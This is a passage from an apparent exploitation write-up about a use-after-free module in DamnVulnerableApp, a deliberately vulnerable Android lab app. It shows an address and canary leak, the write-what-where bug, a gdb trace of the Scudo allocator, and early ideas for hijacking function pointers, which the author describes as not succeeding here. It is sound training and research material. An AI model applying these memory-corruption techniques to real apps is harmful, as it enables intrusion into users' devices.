&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> canary) {
&lt;span style="color:#66d9ef">return&lt;/span>;
}
&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
__stack_chk_fail();
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="trying-to-get-code-execution-in-useafterfreewritemodule">Trying to get code execution in &lt;em>UseAfterFreeWriteModule&lt;/em>&lt;/h2>
&lt;p>In this section various approaches of getting code execution in the &lt;em>UseAfterFreeWriteModule&lt;/em> will be discussed. Although none of them are going to be applicable to this module, they might become relevant for future modules and definitely give some insights into binary exploitation on Android.&lt;/p>
&lt;h3 id="leaking-data">Leaking data&lt;/h3>
&lt;p>As is often the case with secured binaries, we have to defeat &lt;em>ASLR&lt;/em> by leaking some address. &amp;ldquo;Luckily&amp;rdquo;, there is a function that is called as often as we want, which is called &lt;code>lookupExamples&lt;/code> that contains the following code snippet:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">...
length &lt;span style="color:#f92672">=&lt;/span> __strlen_chk(examples[(&lt;span style="color:#66d9ef">int&lt;/span>)index],&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
array &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray)(env,(jsize)length);
(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion)(env,array,&lt;span style="color:#ae81ff">0&lt;/span>,(jsize)length,(jbyte &lt;span style="color:#f92672">*&lt;/span>)(examples &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)index));
...
&lt;span style="color:#66d9ef">return&lt;/span> array;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>There are two aspects to consider:&lt;/p>
&lt;ol>
&lt;li>&lt;code>index&lt;/code> is not checked for &lt;em>out - of - bounds&lt;/em> access.&lt;/li>
&lt;li>&lt;code>(jbyte *)(examples + (int)index)&lt;/code> will result in the address of a string being copied into &lt;code>array&lt;/code>. We know that &lt;code>examples&lt;/code> is probably a string table, because &lt;code>__strlen_chk&lt;/code> is called on &lt;code>examples[(int)index]&lt;/code>.&lt;/li>
&lt;/ol>
&lt;p>Interestingly, the &lt;em>out - of - bounds&lt;/em> access is &lt;strong>not&lt;/strong> really usable, because it requires &lt;code>examples[(int)index]&lt;/code> to be a valid pointer for &lt;code>index &amp;gt;= 4&lt;/code>. But there is no need to read more pointers, as the lengths of the strings in &lt;code>examples&lt;/code> determine the amount of bytes returned. Thus, for &lt;code>index = 3&lt;/code>, the leaked value will contain at least one address, if not more (it is a pretty long string).&lt;/p>
&lt;p>&lt;code>lookupExamples&lt;/code> is called in a loop, where the user is asked for &lt;strong>1 - based&lt;/strong> indices into the array:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-Java" data-lang="Java">&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> index &lt;span style="color:#f92672">=&lt;/span> ByteBuffer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">wrap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>input&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#a6e22e">getInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>index &lt;span style="color:#f92672">==&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>lookupExamples&lt;span style="color:#f92672">(&lt;/span>index &lt;span style="color:#f92672">-&lt;/span> 1&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>When accessing &lt;code>lookupExamples&lt;/code> by sending &lt;code>1 &amp;lt;= index &amp;lt;= 4&lt;/code> we can get the following leaks:&lt;/p>
&lt;pre tabindex="0">&lt;code>[0]: 0x730b9b7a371e --|
[1]: 0x730b9b7a372a | --&amp;gt; from `.rodata`, thus 0x730b9b7a371e - 0x71e = libUseAfterFreeWriteModule.so
[2]: 0x730b9b7a3710 |
[3]: 0x730b9b7a3735 --|
[4]: 0x730b993ba990 --&amp;gt; stack address: array of example strings
[5]: 0x2147eb93990de82b --&amp;gt; 8 byte canary
[6]: 0x730b993ba8c0 --&amp;gt; stack address: stored `rbp`
[7]: 0x730c0379ffac --&amp;gt; `art_quick_generic_jni_trampoline+220`, thus 0x730c0379fed0 = `art_quick_generic_jni_trampoline` and `libart.so = 0x730c03400000`
&lt;/code>&lt;/pre>&lt;p>With the current leak, we get&lt;/p>
&lt;ol>
&lt;li>Address in &lt;code>libUseAfterFreeWriteModule.so&lt;/code> and therefore its base address&lt;/li>
&lt;li>Address in &lt;code>libart.so&lt;/code> and therefore its base address&lt;/li>
&lt;li>Address on stack&lt;/li>
&lt;li>Canary&lt;/li>
&lt;/ol>
&lt;p>Keep in mind that everytime &lt;em>UseAfterFreeWriteModule&lt;/em> is run, the addresses will differ due to ASLR. The above leak is just an example to showcase what it might look like and, most importantly, what the semantics of the leaked values are.&lt;/p>
&lt;h3 id="the-bug">The bug&lt;/h3>
&lt;p>Before showing how to fail to exploit the bug &amp;hellip; well what is the bug anyways? Terms like &lt;em>Write - What - Where&lt;/em> condition have already been mentioned, so lets see the corresponding code:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">...
ptrList &lt;span style="color:#f92672">=&lt;/span> (jlong &lt;span style="color:#f92672">**&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x108&lt;/span>);
free(ptrList);
keyValuePair &lt;span style="color:#f92672">=&lt;/span> (object &lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x108&lt;/span>);
keyLength &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength)(env,key);
reducedKeyLength &lt;span style="color:#f92672">=&lt;/span> (uint)keyLength;
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x100&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> reducedKeyLength) {
reducedKeyLength &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>;
}
iscopy &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
keyBytes &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements)(env,key,&lt;span style="color:#f92672">&amp;amp;&lt;/span>iscopy);
__memcpy_chk(keyValuePair,keyBytes,reducedKeyLength,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
&lt;span style="color:#f92672">**&lt;/span>ptrList &lt;span style="color:#f92672">=&lt;/span> value;
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As can be seen, immediately after allocating memory for a &lt;code>jlong*[33]&lt;/code>, the memory is freed. Then memory is allocated to hold a &lt;code>struct object&lt;/code> (this was deduced from analysis in &lt;em>Ghidra&lt;/em>; the name is chosen arbitrarily). Comparing both &lt;code>malloc&lt;/code> calls reveals that both types of the two variables are of the same size. If &lt;code>malloc&lt;/code> was to return the same chunk twice, whatever is stored in the first 8 bytes of the &lt;code>keyBytes&lt;/code> would be interpreted as a pointer, to which we would write the &lt;code>value&lt;/code>.&lt;/p>
&lt;p>Knowing our beloved &lt;code>dlmalloc&lt;/code> (the glibc&amp;rsquo;s implementation of &lt;code>malloc&lt;/code>), we can assume that &lt;code>keyValuePair&lt;/code> will be assigned the same chunk as &lt;code>ptrList&lt;/code>, right? I.e. &lt;code>keyValuePair = ptrList&lt;/code>, where &lt;code>ptrList&lt;/code> is a dangling pointer, because its memory has already been freed? Well &amp;hellip; the interesting thing is that it actually works, i.e. &lt;code>keyValuePair = ptrList&lt;/code>, but this is &lt;strong>not due to dlmalloc&lt;/strong>!&lt;/p>
&lt;p>Lets confirm my statement with some disassembly. To that end, observe that &lt;code>ptrList = *($rbp-0x58)&lt;/code> and &lt;code>keyValuePair = *($rbp-0x60)&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>[1] gef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair
...
0x0000730b9ed59a1a &amp;lt;+42&amp;gt;: call 0x730b9ed59b80 &amp;lt;malloc@plt&amp;gt;
0x0000730b9ed59a1f &amp;lt;+47&amp;gt;: mov QWORD PTR [rbp-0x58],rax &amp;lt;--- result of first malloc
0x0000730b9ed59a23 &amp;lt;+51&amp;gt;: mov rdi,QWORD PTR [rbp-0x58]
0x0000730b9ed59a27 &amp;lt;+55&amp;gt;: call 0x730b9ed59b90 &amp;lt;free@plt&amp;gt;
0x0000730b9ed59a2c &amp;lt;+60&amp;gt;: mov edi,0x108
0x0000730b9ed59a31 &amp;lt;+65&amp;gt;: call 0x730b9ed59b80 &amp;lt;malloc@plt&amp;gt;
0x0000730b9ed59a36 &amp;lt;+70&amp;gt;: mov QWORD PTR [rbp-0x60],rax &amp;lt;--- result of second malloc
...
gef➤ x/1gx $rbp-0x58
0x730b9c970828: 0x0000730cb77bb950
gef➤ x/1gx $rbp-0x60
0x730b9c970820: 0x0000730cb77bb950
[2] gef➤ pipe vmmap | grep primary | grep cb77
0x00730cb77b3000 0x00730cb77f3000 0x00000000000000 rw- [anon:scudo:primary]
[3] gef➤ disassemble malloc
Dump of assembler code for function malloc:
0x0000730eb408fda0 &amp;lt;+0&amp;gt;: push r14
0x0000730eb408fda2 &amp;lt;+2&amp;gt;: push rbx
0x0000730eb408fda3 &amp;lt;+3&amp;gt;: push rax
0x0000730eb408fda4 &amp;lt;+4&amp;gt;: mov r14,rdi
0x0000730eb408fda7 &amp;lt;+7&amp;gt;: mov rax,QWORD PTR [rip+0x982a2] # 0x730eb4128050 &amp;lt;__libc_globals+80&amp;gt;
0x0000730eb408fdae &amp;lt;+14&amp;gt;: test rax,rax
0x0000730eb408fdb1 &amp;lt;+17&amp;gt;: jne 0x730eb408fdcb &amp;lt;malloc+43&amp;gt;
0x0000730eb408fdb3 &amp;lt;+19&amp;gt;: call 0x730eb40950f0 &amp;lt;scudo_malloc&amp;gt;
0x0000730eb408fdb8 &amp;lt;+24&amp;gt;: mov rbx,rax
0x0000730eb408fdbb &amp;lt;+27&amp;gt;: test rax,rax
0x0000730eb408fdbe &amp;lt;+30&amp;gt;: je 0x730eb408fdd0 &amp;lt;malloc+48&amp;gt;
0x0000730eb408fdc0 &amp;lt;+32&amp;gt;: mov rax,rbx
0x0000730eb408fdc3 &amp;lt;+35&amp;gt;: add rsp,0x8
0x0000730eb408fdc7 &amp;lt;+39&amp;gt;: pop rbx
0x0000730eb408fdc8 &amp;lt;+40&amp;gt;: pop r14
0x0000730eb408fdca &amp;lt;+42&amp;gt;: ret
0x0000730eb408fdcb &amp;lt;+43&amp;gt;: call QWORD PTR [rax+0x18]
[4] gef➤ p/x 0x982a2 + 0x0000730eb408fdae
$1 = 0x730eb4128050
gef➤ x/1gx 0x730eb4128050
0x730eb4128050 &amp;lt;__libc_globals+80&amp;gt;: 0x0000000000000000
[5] gef➤ disassemble scudo_malloc
Dump of assembler code for function scudo_malloc:
0x0000730eb40950f0 &amp;lt;+0&amp;gt;: push rbx
0x0000730eb40950f1 &amp;lt;+1&amp;gt;: mov rsi,rdi
0x0000730eb40950f4 &amp;lt;+4&amp;gt;: lea rdi,[rip+0x9b5c5] # 0x730eb41306c0 &amp;lt;_ZL9Allocator&amp;gt;
0x0000730eb40950fb &amp;lt;+11&amp;gt;: mov ecx,0x10
0x0000730eb4095100 &amp;lt;+16&amp;gt;: xor edx,edx
0x0000730eb4095102 &amp;lt;+18&amp;gt;: xor r8d,r8d
0x0000730eb4095105 &amp;lt;+21&amp;gt;: call 0x730eb4094a20 &amp;lt;_ZN5scudo9AllocatorINS_13AndroidConfigEXadL_Z21scudo_malloc_postinitEEE8allocateEmNS_5Chunk6OriginEmb&amp;gt;
0x0000730eb409510a &amp;lt;+26&amp;gt;: mov rbx,rax
0x0000730eb409510d &amp;lt;+29&amp;gt;: test rax,rax
0x0000730eb4095110 &amp;lt;+32&amp;gt;: je 0x730eb4095117 &amp;lt;scudo_malloc+39&amp;gt;
0x0000730eb4095112 &amp;lt;+34&amp;gt;: mov rax,rbx
0x0000730eb4095115 &amp;lt;+37&amp;gt;: pop rbx
0x0000730eb4095116 &amp;lt;+38&amp;gt;: ret
0x0000730eb4095117 &amp;lt;+39&amp;gt;: call 0x730eb411a850 &amp;lt;__errno@plt&amp;gt;
0x0000730eb409511c &amp;lt;+44&amp;gt;: mov DWORD PTR [rax],0xc
0x0000730eb4095122 &amp;lt;+50&amp;gt;: mov rax,rbx
0x0000730eb4095125 &amp;lt;+53&amp;gt;: pop rbx
0x0000730eb4095126 &amp;lt;+54&amp;gt;: ret
&lt;/code>&lt;/pre>&lt;p>Lets digest what we just witnessed:&lt;/p>
&lt;ol>
&lt;li>Identifying the values of &lt;code>ptrList&lt;/code> and &lt;code>keyValuePair&lt;/code> and confirming that &lt;code>ptrList = keyValuePair&lt;/code>&lt;/li>
&lt;li>Checking where &lt;code>ptrList&lt;/code> and &lt;code>keyValuePair&lt;/code> point to. They are pointing to some &lt;em>primary&lt;/em> location?&lt;/li>
&lt;li>As we called &lt;code>malloc&lt;/code> to allocate memory, we quickly check its disassembly and observe that there is a call to &lt;code>scudo_malloc&lt;/code> in case there is a zero at &lt;code>rip + 0x982a2 = 0x0000730eb408fdae + 0x982a2&lt;/code>.&lt;/li>
&lt;li>Verify that indeed &lt;code>scudo_malloc&lt;/code> is called. Btw. if &lt;code>rip + 0x982a2&lt;/code> pointed to a global memory region that is writable, we might be able to introduce our own, totally benign implementation of &lt;code>malloc&lt;/code>.&lt;/li>
&lt;li>Check implementation of &lt;code>scudo_malloc&lt;/code>. It internally calls &lt;code>scudo::Allocator&amp;lt;...&amp;gt;::allocate&lt;/code> (using &lt;a href="https://man7.org/linux/man-pages/man1/c++filt.1.html">&lt;em>c++filt&lt;/em>&lt;/a> to demangle mangled names).&lt;/li>
&lt;/ol>
&lt;p>We can observe a similar behaviour for &lt;code>free&lt;/code>, which winds up to call &lt;code>scudo::Allocator&amp;lt;scudo::AndroidConfig, &amp;amp;(scudo_malloc_postinit)&amp;gt;::deallocate(void*, scudo::Chunk::Origin, unsigned long, unsigned long)&lt;/code>.&lt;/p>
&lt;h4 id="introducing-scudo-the-allocator">Introducing &lt;em>Scudo&lt;/em>, the Allocator&lt;/h4>
&lt;p>&lt;a href="https://source.android.com/docs/security/test/scudo">&lt;em>Scudo&lt;/em>&lt;/a> is an allocator that is used for all native code from Android 11 onwards. Its source code can be found &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/">here&lt;/a>.&lt;/p>
&lt;p>We are going to take a practical approach, i.e. hunt down the functionality as quickly as possible to verify that &lt;code>ptrList = keyValuePair&lt;/code> was not a coincidence. To that end, I will only present small excerpts of code.&lt;/p>
&lt;p>As seen &lt;a href="#the-bug">above&lt;/a>, &lt;code>scudo_malloc&lt;/code> calls &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=292">&lt;code>scudo::Allocator&amp;lt;...&amp;gt;::allocate(unsigned long, scudo::Chunk::Origin, unsigned long, bool)&lt;/code>&lt;/a>. Analyzing the implementation reveals:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">...
&lt;span style="color:#66d9ef">if&lt;/span> (LIKELY(PrimaryT&lt;span style="color:#f92672">::&lt;/span>canAllocate(NeededSize))) {
...
Block &lt;span style="color:#f92672">=&lt;/span> TSD&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Cache.allocate(ClassId);
...
}
...
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>Ptr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">reinterpret_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&amp;gt;&lt;/span>(UserPtr);
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>TaggedPtr &lt;span style="color:#f92672">=&lt;/span> Ptr;
...
&lt;span style="color:#66d9ef">return&lt;/span> TaggetPtr;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Ptr&lt;/code> is computed from &lt;code>Block&lt;/code>, but that is irrelevant for now. Tracing &lt;code>TSD-&amp;gt;Cache.allocate(ClassId)&lt;/code> gets us to the &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=70">implementation&lt;/a> we wanted to see:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">allocate&lt;/span>(uptr ClassId) {
...
PerClass &lt;span style="color:#f92672">*&lt;/span>C &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PerClassArray[ClassId];
...
CompactPtrT CompactP &lt;span style="color:#f92672">=&lt;/span> C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Chunks[&lt;span style="color:#f92672">--&lt;/span>C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count];
...
&lt;span style="color:#66d9ef">return&lt;/span> Allocator&lt;span style="color:#f92672">-&amp;gt;&lt;/span>decompactPtr(ClassId, CompactP);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Reversing the type definitions shows that &lt;code>CompactPtrT = uintptr_t&lt;/code>, so its just a normal pointer. Finally, inspecting &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=135">&lt;code>PerClass&lt;/code>&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">PerClass&lt;/span> {
u32 Count; &lt;span style="color:#75715e">// &amp;lt;-- amount of free chunks in block
&lt;/span>&lt;span style="color:#75715e">&lt;/span> u32 MaxCount; &lt;span style="color:#75715e">// &amp;lt;-- no idea
&lt;/span>&lt;span style="color:#75715e">&lt;/span> uptr ClassSize; &lt;span style="color:#75715e">// &amp;lt;-- size of a single chunk in bytes
&lt;/span>&lt;span style="color:#75715e">&lt;/span> CompactPtrT Chunks[&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">*&lt;/span> TransferBatch&lt;span style="color:#f92672">::&lt;/span>MaxNumCached]; &lt;span style="color:#75715e">// &amp;lt;-- chunks, freed and used
&lt;/span>&lt;span style="color:#75715e">&lt;/span>};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Basically &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=70">&lt;code>SizeClassAllocatorLocalCache::allocate(uptr ClassId)&lt;/code>&lt;/a> will get the next free chunk by decreasing &lt;code>PerClass::Count&lt;/code> by 1 and taking this as an index into &lt;code>PerClass::Chunks&lt;/code>.&lt;/p>
&lt;p>Similarly, for &lt;code>scudo_free&lt;/code>, we end up running &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=88">&lt;code>SizeClassAllocatorLocalCache::deallocate(uptr ClassId, void *P)&lt;/code>&lt;/a>(this is non - trivial to see, but is what actually happens):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">deallocate&lt;/span>(uptr ClassId, &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>P) {
...
PerClass &lt;span style="color:#f92672">*&lt;/span>C &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PerClassArray[ClassId];
...
C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Chunks[C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count&lt;span style="color:#f92672">++&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> Allocator&lt;span style="color:#f92672">-&amp;gt;&lt;/span>compactPtr(ClassId, &lt;span style="color:#66d9ef">reinterpret_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>uptr&lt;span style="color:#f92672">&amp;gt;&lt;/span>(P));
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This method frees a chunk by writing the compacted pointer back into the array and adding 1 to &lt;code>PerClass::Count&lt;/code>. Therefore, the sequence&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C"> &lt;span style="color:#66d9ef">struct&lt;/span> manager &lt;span style="color:#f92672">*&lt;/span>m &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">struct&lt;/span> manager&lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> manager));
free(m);
&lt;span style="color:#66d9ef">struct&lt;/span> object &lt;span style="color:#f92672">*&lt;/span>obj &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">struct&lt;/span> object&lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> object));
&lt;/code>&lt;/pre>&lt;/div>&lt;p>results in decrementing &lt;code>PerClass::Count&lt;/code> (w.r.t. corresponding class id), incrementing it and then decrementing it again while writing the same pointer. This is why we get that &lt;code>ptrList = keyValuePair&lt;/code>. Notice that there are probably optimizations in place that handle memory shortages etc. As &lt;em>DamnVulnerableApp&lt;/em> is the only app I run on the emulator, it might differ from what you get on a busy device.&lt;/p>
&lt;h3 id="trying-to-exploit">Trying to exploit&lt;/h3>
&lt;p>Lets recall the setting we are in:&lt;/p>
&lt;ol>
&lt;li>We are given a &lt;em>Write - What - Where&lt;/em> condition, which allows us to write anywhere we want. It is possible to write code and data, but notice that all writable memory regions (&lt;code>.bss&lt;/code>, &lt;code>.data&lt;/code>, &lt;code>stack&lt;/code>, &lt;code>heap&lt;/code>) are &lt;strong>not&lt;/strong> executable.&lt;/li>
&lt;li>We have access to &lt;code>libart.so&lt;/code>, &lt;code>libUseAfterFreeWriteModule.so&lt;/code>, the stack and the canary.&lt;/li>
&lt;/ol>
&lt;p>The &lt;em>Goal&lt;/em>: Arbitrary Code Execution&lt;/p>
&lt;h4 id="sniffing-out-function-pointers">Sniffing out function pointers&lt;/h4>
&lt;p>The first idea is to find a sequence of function calls, for which we have suitable control over the parameters. Redirecting the pointers of those functions by e.g. overwriting the &lt;em>vtable&lt;/em> would allow to execute arbitrary functions that are &lt;em>resistent&lt;/em> to &lt;code>__thiscall&lt;/code>. This basically means that those functions do not use the first parameter at all or use it in a way that is beneficial to us.&lt;/p>
&lt;p>Unfortunately, &lt;em>vtables&lt;/em> are located in a read - only section. This can be proven by observing that mangled &lt;em>vtable&lt;/em> names start with &amp;ldquo;_ZTV&amp;rdquo;. To be precise, only &lt;a href="https://itanium-cxx-abi.github.io/cxx-abi/abi-mangling.html">&amp;ldquo;TV&amp;rdquo;&lt;/a> indicates that this is a &lt;em>vtable&lt;/em>. Next, analysing all publicly available &lt;em>vtables&lt;/em>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --symbols libart.so | grep &lt;span style="color:#e6db74">&amp;#34;_ZTV&amp;#34;&lt;/span>
...
13121: 0000000000c17e18 &lt;span style="color:#ae81ff">32&lt;/span> OBJECT WEAK PROTECTED &lt;span style="color:#ae81ff">16&lt;/span> _ZTVN3art32BuildNativeCallFrameStateMachineINS_26ComputeNativeCallFrameSizeEEE
$ readelf --wide --sections libart.so
...
&lt;span style="color:#f92672">[&lt;/span>16&lt;span style="color:#f92672">]&lt;/span> .data.rel.ro PROGBITS 0000000000c0aa40 80aa40 010b00 &lt;span style="color:#ae81ff">00&lt;/span> WA &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Note that I might have missed a &lt;em>vtable&lt;/em>, but this was enough to quit persuing the &lt;em>vtable&lt;/em> - approach. If we were able to call &lt;code>mprotect&lt;/code> on the &lt;em>vtables&lt;/em>, maybe it could be possible to make the &lt;em>vtables&lt;/em> writable. Although for this to work, we would need to find a function call that provides a virtual function with the exact parameters we need for &lt;code>mprotect&lt;/code>. Therefore, &lt;code>__thiscall&lt;/code> is again a challenge.&lt;/p>
&lt;p>Luckily, there are other, globally available objects that contain important function pointers. This time, the target will be to abuse the sequence of &lt;code>JNIEnv&lt;/code> - function calls in a JNI function.&lt;/p>
&lt;p>Observe that, if a JNI method is called (in this module), it will be called via a generic trampoline, i.e. via &lt;code>artQuickGenericJniTrampoline&lt;/code> in assembly in &lt;code>art_quick_generic_jni_trampoline&lt;/code>. The first parameter is &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/entrypoints/quick/quick_trampoline_entrypoints.cc;l=1936;drc=1e6140afcea4c0f4bd9480bcca29e7939a3999c9">ALWAYS&lt;/a> of type &lt;code>JNIEnv*&lt;/code>. The jni object is fetched via &lt;code>Thread::GetJniEnv&lt;/code>, which returns an instance of &lt;code>JNIEnvExt&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">JniEnvExt&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> JNIEnv {...}
...
&lt;span style="color:#75715e">#if defined(__cplusplus)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">typedef&lt;/span> _JNIEnv JNIEnv;
&lt;span style="color:#75715e">#else
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">JNINativeInterface&lt;/span>&lt;span style="color:#f92672">*&lt;/span> JNIEnv;
...
&lt;span style="color:#75715e">#endif
&lt;/span>&lt;span style="color:#75715e">&lt;/span>...
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * C++ object wrapper.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * This is usually overlaid on a C struct whose first element is a
&lt;/span>&lt;span style="color:#75715e"> * JNINativeInterface*. We rely somewhat on compiler behavior.
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
